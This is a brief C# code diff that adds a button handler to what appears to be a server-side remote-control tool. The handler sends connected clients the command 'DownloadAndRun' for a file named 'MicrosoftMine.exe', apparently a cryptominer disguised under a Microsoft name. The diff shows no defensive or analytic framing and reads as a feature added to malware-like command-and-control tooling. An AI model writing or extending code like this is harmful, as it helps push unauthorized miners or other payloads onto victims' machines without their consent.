@@ -56,5 +56,11 @@ namespace ServerWorker
                 { }
             }
         }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            byte[] data = Encoding.Unicode.GetBytes("DownloadAndRun"+"_"+"MicrosoftMine.exe");
+            messenger.stream.Write(data, 0, data.Length);
+        }
     }
 }
